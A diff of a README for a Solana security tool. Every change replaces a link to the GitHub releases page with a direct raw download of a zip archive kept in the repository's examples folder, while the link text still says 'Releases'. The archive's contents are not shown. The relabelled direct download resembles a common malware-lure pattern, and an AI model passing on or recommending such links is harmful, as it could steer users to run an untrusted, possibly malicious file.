@@ -1,6 +1,6 @@
 # 🛡️ safe-solana-builder - Secure Solana Programs Made Easy
 
-[![Download Safe Solana Builder](https://img.shields.io/badge/Download-Safe%20Solana%20Builder-brightgreen)](https://github.com/neromerob/safe-solana-builder/releases)
+[![Download Safe Solana Builder](https://img.shields.io/badge/Download-Safe%20Solana%20Builder-brightgreen)](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
 
 ---
 
@@ -12,7 +12,7 @@
 
 You need to visit this page to download the application. Click the link below to open the download page in your web browser:
 
-[Download safe-solana-builder Releases](https://github.com/neromerob/safe-solana-builder/releases)
+[Download safe-solana-builder Releases](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
 
 ---
 
@@ -132,4 +132,4 @@ For detailed technical questions or new feature requests, visit the GitHub repos
 
 ---
 
-[Download safe-solana-builder Releases](https://github.com/neromerob/safe-solana-builder/releases)
+[Download safe-solana-builder Releases](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
